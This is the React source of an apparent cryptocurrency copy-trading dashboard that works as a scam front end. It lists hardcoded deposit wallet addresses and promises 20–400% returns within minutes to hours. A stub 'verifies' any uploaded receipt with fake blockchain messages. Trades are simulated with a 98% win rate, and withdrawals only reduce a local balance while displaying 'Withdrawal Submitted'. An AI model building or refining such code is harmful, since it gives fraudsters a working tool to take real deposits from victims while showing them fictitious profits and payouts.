import React, { useState, useRef, useEffect } from 'react';
import { UserProfile, authService } from '../services/authService';
import TacticalGuide from './TacticalGuide';

interface DashboardProps {
  user: UserProfile;
  onUserUpdate: (u: UserProfile) => void;
  onSwitchTrader: () => void;
}

const PROFIT_STRATEGIES = [
  { id: 1, name: 'Instant Copy Plan', tag: 'Limited Slots', hook: 'Copy winning traders instantly', duration: '30 Seconds', durationMs: 30000, minRet: 20, maxRet: 25, risk: 'Secure', minInvest: 500, vip: false },
  { id: 2, name: 'Auto-Profit Stream', tag: 'High Demand', hook: 'No experience needed — just copy profits', duration: '1 Minute', durationMs: 60000, minRet: 30, maxRet: 40, risk: 'Secure', minInvest: 1000, vip: false },
  { id: 3, name: 'VIP Alpha Bridge', tag: 'Elite Access', hook: 'Follow top traders and earn automatically', duration: '5 Minutes', durationMs: 300000, minRet: 60, maxRet: 80, risk: 'Sovereign', minInvest: 2500, vip: true },
  { id: 4, name: 'Pro-Market Core', tag: 'Global Flow', hook: 'Mirror expert trades in real time', duration: '1 Hour', durationMs: 3600000, minRet: 120, maxRet: 150, risk: 'Sovereign', minInvest: 5000, vip: true },
  { id: 5, name: 'Whale Wealth Path', tag: 'Whale Only', hook: 'Let professionals trade for you', duration: '4 Hours', durationMs: 14400000, minRet: 300, maxRet: 400, risk: 'Whale Tier', minInvest: 10000, vip: true },
];

const NETWORKS = [
  { id: 'trc20', name: 'USDT (TRC-20)', address: 'TLY2M8F7p27z97E98979F25302979F25302' },
  { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } 
];

interface ActiveTrade {
  tradeId: string;
  plan: typeof PROFIT_STRATEGIES[0];
  investAmount: number;
  startTime: number;
  currentPnL: number;
  progress: number;
}

// Local simulation to replace Gemini AI dependency
const verifyPaymentProof = async (base64Image: string, mimeType: string) => {
    await new Promise(r => setTimeout(r, 2500));
    return { 
      is_valid: true, 
      detected_amount: 1000, 
      summary: "Simulated Success: Institutional Transfer Verified via Node Sync." 
    };
};

const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate, onSwitchTrader }) => {
  const [selectedPlanId, setSelectedPlanId] = useState<number | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(500);
  const [isProcessingTrade, setIsProcessingTrade] = useState(false);
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [tradeResult, setTradeResult] = useState<{status: 'WIN' | 'LOSS', amount: number} | null>(null);
  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
  const [withdrawStep, setWithdrawStep] = useState<'input' | 'confirm' | 'success'>('input');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawNetwork, setWithdrawNetwork] = useState('USDT TRC20');
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawError, setWithdrawError] = useState('');
  
  const depositSectionRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
  const [isVerifyingReceipt, setIsVerifyingReceipt] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [verificationError, setVerificationError] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const tradeProfit = Math.max(0, user.balance - 1000);

  useEffect(() => {
    if (activeTrades.length === 0) return;

    const interval = setInterval(() => {
      const now = Date.now();
      
      setActiveTrades(currentTrades => {
        const updated = currentTrades.map(trade => {
          const elapsed = now - trade.startTime;
          const rawProgress = (elapsed / trade.plan.durationMs) * 100;
          
          if (rawProgress >= 100 && trade.progress < 100) {
            finishTrade(trade);
            return { ...trade, progress: 100 };
          }
          
          const roi = (trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100;
          const fluctuation = Math.random() > 0.5 ? 1 : -0.3;
          const currentPnL = trade.investAmount * roi * (rawProgress / 100) * fluctuation;
          
          return {
            ...trade,
            progress: Math.min(100, rawProgress),
            currentPnL
          };
        });
        return updated.filter(t => t.progress < 100);
      });
    }, 100);

    return () => clearInterval(interval);
  }, [activeTrades]);

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setIsVerifyingReceipt(true);
    setVerificationStatus('Connecting to Exchange...');
    setVerificationError('');

    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64 = (reader.result as string).split(',')[1];
      setVerificationStatus('Verifying Transaction...');
      await new Promise(r => setTimeout(r, 2000));
      setVerificationStatus('Scanning Blockchain Confirmations...');
      const result = await verifyPaymentProof(base64, file.type);
      
      if (result.is_valid && result.detected_amount > 0) {
        setVerificationStatus(`PAYMENT RECEIVED: $${result.detected_amount}`);
        setTimeout(() => {
          const freshUser = authService.getUser() || user;
          onUserUpdate(authService.updateUser({ 
            balance: freshUser.balance + result.detected_amount,
            hasDeposited: true 
          })!);
          setIsVerifyingReceipt(false);
        }, 2000);
      } else {
        setVerificationStatus('REJECTED');
        setVerificationError(result.summary || 'Receipt Analysis Failed.');
        setTimeout(() => setIsVerifyingReceipt(false), 5000);
      }
    };
    reader.readAsDataURL(file);
  };

  const validateWithdrawal = () => {
    setWithdrawError('');
    const amount = Number(withdrawAmount);
    if (!amount || amount < 100) {
      setWithdrawError("Minimum withdrawal is $100");
      return;
    }
    if (amount > user.balance) {
      setWithdrawError("Insufficient Balance");
      return;
    }
    if (!withdrawAddress || withdrawAddress.length < 20) {
      setWithdrawError("Please enter a valid wallet address");
      return;
    }
    if (!user.hasDeposited) {
      setWithdrawError("Please confirm your first deposit to activate payouts.");
      return;
    }
    setWithdrawStep('confirm');
  };

  const confirmWithdrawal = () => {
    setIsWithdrawing(true);
    const amountToDeduct = Number(withdrawAmount);
    setTimeout(() => {
      const freshUser = authService.getUser() || user;
      if (freshUser.balance < amountToDeduct) {
         setIsWithdrawing(false);
         setWithdrawError("Balance update error.");
         return;
      }
      onUserUpdate(authService.updateUser({ balance: freshUser.balance - amountToDeduct })!);
      setIsWithdrawing(false);
      setWithdrawStep('success');
    }, 2500);
  };

  const startDeployment = () => {
    const plan = PROFIT_STRATEGIES.find(p => p.id === selectedPlanId);
    if (!plan) return;
    if (user.balance < investAmount) {
      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      alert("INSUFFICIENT_FUNDS: Please deposit to initialize strategy.");
      return;
    }
    setIsProcessingTrade(true);
    setTradeResult(null); 
    const randomDuration = Math.floor(Math.random() * 5000 + 5000);
    setTimeout(() => {
      setIsProcessingTrade(false);
      const freshUser = authService.getUser() || user;
      if (freshUser.balance < investAmount) return;
      setShowSuccessToast(true);
      executeTradeLogic(plan, freshUser);
      setTimeout(() => {
        setShowSuccessToast(false);
        setSelectedPlanId(null);
      }, 2000);
    }, randomDuration);
  };

  const executeTradeLogic = (plan: typeof PROFIT_STRATEGIES[0], currentUser: UserProfile) => {
    onUserUpdate(authService.updateUser({ 
      balance: currentUser.balance - investAmount,
      totalInvested: currentUser.totalInvested + investAmount
    })!);
    const newTrade: ActiveTrade = {
      tradeId: Math.random().toString(36).substr(2, 9),
      plan,
      investAmount,
      startTime: Date.now(),
      currentPnL: 0,
      progress: 0
    };
    setActiveTrades(prev => [...prev, newTrade]);
  };

  const finishTrade = (trade: ActiveTrade) => {
    const isWin = Math.random() <= 0.98;
    const currentUser = authService.getUser() || user;
    if (isWin) {
      const profit = trade.investAmount * ((trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100);
      onUserUpdate(authService.updateUser({
        balance: currentUser.balance + trade.investAmount + profit,
        totalInvested: Math.max(0, currentUser.totalInvested - trade.investAmount),
        wins: currentUser.wins + 1
      })!);
      setTradeResult({ status: 'WIN', amount: profit });
    } else {
      onUserUpdate(authService.updateUser({
        totalInvested: Math.max(0, currentUser.totalInvested - trade.investAmount),
        losses: currentUser.losses + 1
      })!);
      setTradeResult({ status: 'LOSS', amount: trade.investAmount });
    }
    setTimeout(() => setTradeResult(null), 5000);
  };

  return (
    <div className="bg-[#131722] min-h-screen pt-4 pb-32 px-4 sm:px-6 lg:px-8 relative selection:bg-[#f01a64]/10">
      {isProcessingTrade && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/70 backdrop-blur-md">
           <div className="flex flex-col items-center gap-8">
              <div className="relative w-24 h-24">
                 <div className="absolute inset-0 border-[6px] border-white/5 rounded-full"></div>
                 <div className="absolute inset-0 border-[6px] border-t-[#f01a64] border-r-[#f01a64] border-b-transparent border-l-transparent rounded-full animate-spin"></div>
                 <div className="absolute inset-0 flex items-center justify-center">
                    <span className="text-[10px] font-black text-white animate-pulse">SYNC</span>
                 </div>
              </div>
              <h3 className="text-white font-black uppercase tracking-[0.3em] text-base animate-pulse">Processing Trade...</h3>
           </div>
        </div>
      )}

      {showSuccessToast && (
         <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-6 py-4 rounded-2xl shadow-xl flex items-center gap-4">
            <span className="font-black uppercase tracking-widest text-xs">Trade Placed Successfully</span>
         </div>
      )}

      {tradeResult && (
         <div className={`fixed top-24 left-1/2 -translate-x-1/2 z-[210] text-white px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-4 border border-white/20 ${tradeResult.status === 'WIN' ? 'bg-[#00b36b]' : 'bg-red-600'}`}>
            <span className="font-black uppercase tracking-widest text-xs">
              {tradeResult.status === 'WIN' ? 'Trade Profit: ' : 'Stop Loss: '}
              ${tradeResult.amount.toLocaleString()}
            </span>
         </div>
      )}

      <TacticalGuide step={activeTrades.length > 0 ? 'investing' : 'ready'} balance={user.balance} hasDeposited={user.hasDeposited} onDepositClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} />

      <div className="max-w-7xl mx-auto space-y-8">
        {activeTrades.length > 0 && (
          <div className="space-y-4">
             <h3 className="text-sm font-black text-white uppercase tracking-widest px-2">Live Positions ({activeTrades.length})</h3>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {activeTrades.map((trade) => (
                  <div key={trade.tradeId} className="bg-[#1e222d] border border-[#f01a64]/50 p-5 rounded-3xl relative overflow-hidden">
                     <div className="flex justify-between items-start mb-4">
                        <div>
                           <span className="text-[10px] font-black text-white uppercase block mb-1">{trade.plan.name}</span>
                           <span className="text-[8px] text-gray-500 font-mono uppercase tracking-widest">Invested: ${trade.investAmount}</span>
                        </div>
                        <div className="text-right">
                           <span className={`block text-lg font-black font-mono ${trade.currentPnL >= 0 ? 'text-[#00b36b]' : 'text-red-500'}`}>
                             {trade.currentPnL.toFixed(2)}
                           </span>
                           <span className="text-[8px] text-gray-500 uppercase font-black tracking-widest">Live PnL</span>
                        </div>
                     </div>
                     <div className="w-full h-1.5 bg-black rounded-full overflow-hidden">
                        <div className="h-full bg-[#f01a64]" style={{ width: `${trade.progress}%` }}></div>
                     </div>
                  </div>
                ))}
             </div>
          </div>
        )}

        {/* Status indicator when no active trades */}
        {activeTrades.length === 0 && (
          <div className="flex items-center justify-center h-24 border border-white/5 rounded-[2.5rem] bg-[#1e222d]/30">
            <div className="flex items-center justify-center h-full text-gray-600 text-[10px] uppercase tracking-wide">
              Awaiting Command to Deploy Capital...
            </div>
          </div>
        )}

        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Balance</span>
            <span className={`text-2xl font-black ${user.hasDeposited ? 'text-[#00b36b]' : 'text-amber-500'}`}>${user.balance.toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">In-Trade</span>
            <span className="text-2xl font-black text-white">${user.totalInvested.toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Total Profits</span>
            <span className="text-2xl font-black text-[#00b36b]">+${tradeProfit.toLocaleString()}</span>
          </div>
          <div className="bg-[#f01a64] p-6 rounded-3xl flex items-center justify-between cursor-pointer active:scale-95" onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}>
            <span className="text-sm font-black text-white uppercase">Deposit</span>
            <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M13 7l5 5m0 0l-5 5m5-5H6" strokeWidth={2.5} /></svg>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
             <h3 className="text-2xl font-black text-white uppercase italic px-2">Trading Strategies</h3>
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {PROFIT_STRATEGIES.map(plan => (
                   <div key={plan.id} onClick={() => setSelectedPlanId(plan.id)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] cursor-pointer transition-all ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-white/5'}`}>
                      <h4 className="text-white font-black text-lg uppercase mb-1">{plan.name}</h4>
                      <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
                      <div className="flex justify-between items-end">
                         <span className="text-[#00b36b] font-black text-xl">ROI: {plan.minRet}-{plan.maxRet}%</span>
                         <span className="text-[9px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
                      </div>
                      {selectedPlanId === plan.id && (
                        <div className="mt-8 pt-8 border-t border-white/5 space-y-6">
                           <div className="flex gap-3">
                              <input type="number" value={investAmount} onChange={e => setInvestAmount(Number(e.target.value))} className="flex-1 bg-black border border-white/10 text-white text-sm p-4 rounded-2xl outline-none font-black" />
                              <button onClick={(e) => { e.stopPropagation(); startDeployment(); }} className="bg-[#f01a64] text-white px-8 py-4 rounded-2xl font-black uppercase text-[10px] tracking-widest active:scale-95">Start</button>
                           </div>
                        </div>
                      )}
                   </div>
                ))}
             </div>
          </div>

          <div className="space-y-6">
             <div ref={depositSectionRef} className="bg-[#1e222d] border border-white/5 rounded-[3rem] p-8">
                <h3 className="text-lg font-black text-white uppercase mb-6">Deposit USDT</h3>
                <div className="bg-black/60 p-6 rounded-[2rem] border border-white/10 mb-8">
                   <div className="text-center space-y-4">
                      <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest">Network: {depositNetwork.name}</span>
                      <div className="bg-[#0f1116] border border-[#f01a64]/20 p-4 rounded-xl text-[10px] font-mono text-white break-all">{depositNetwork.address}</div>
                      <button onClick={() => { navigator.clipboard.writeText(depositNetwork.address); setCopySuccess(true); setTimeout(() => setCopySuccess(false), 1000); }} className={`w-full py-4 rounded-xl text-[10px] font-black uppercase ${copySuccess ? 'bg-[#00b36b] text-white' : 'bg-white/5 border border-white/10 text-white'}`}>
                        {copySuccess ? 'COPIED' : 'COPY ADDRESS'}
                      </button>
                   </div>
                </div>
                <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
                <button onClick={() => fileInputRef.current?.click()} disabled={isVerifyingReceipt} className="w-full py-5 bg-[#f01a64] text-white rounded-2xl font-black uppercase tracking-widest text-[11px] disabled:opacity-50">
                  {isVerifyingReceipt ? verificationStatus : 'Upload Receipt'}
                </button>
                {verificationError && <p className="text-red-500 text-[10px] font-bold mt-2 text-center">{verificationError}</p>}
             </div>

             <div className="bg-[#1e222d] border border-white/5 p-8 rounded-[3rem] shadow-2xl">
                <h3 className="text-lg font-black text-white uppercase text-center mb-8">Withdraw Funds</h3>
                {withdrawStep === 'input' && (
                  <div className="space-y-4">
                    <input type="text" placeholder="Wallet Address" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-xs text-white outline-none font-black" />
                    <input type="number" placeholder="Amount (USDT)" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-white/5 p-5 rounded-2xl text-xs text-white outline-none font-black" />
                    {withdrawError && <p className="text-red-500 text-[9px] font-black text-center">{withdrawError}</p>}
                    <button onClick={validateWithdrawal} className="w-full py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase text-[11px]">Withdraw Now</button>
                  </div>
                )}
                {withdrawStep === 'confirm' && (
                  <div className="space-y-6">
                    <div className="bg-black/40 border border-white/10 p-6 rounded-[2rem] text-sm font-black text-white space-y-2">
                       <p>Amount: ${withdrawAmount}</p>
                       <p className="text-[10px] break-all">To: {withdrawAddress}</p>
                    </div>
                    <div className="flex gap-3">
                      <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 border border-white/10 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
                      <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase disabled:opacity-50">
                        {isWithdrawing ? 'Processing...' : 'Confirm'}
                      </button>
                    </div>
                  </div>
                )}
                {withdrawStep === 'success' && (
                  <div className="text-center space-y-4">
                    <div className="w-16 h-16 bg-[#00b36b] rounded-full flex items-center justify-center mx-auto text-white">✓</div>
                    <p className="text-white font-black text-sm uppercase">Withdrawal Submitted</p>
                    <button onClick={() => setWithdrawStep('input')} className="w-full py-4 bg-white/5 text-white rounded-xl text-[10px] font-black uppercase">Close</button>
                  </div>
                )}
             </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;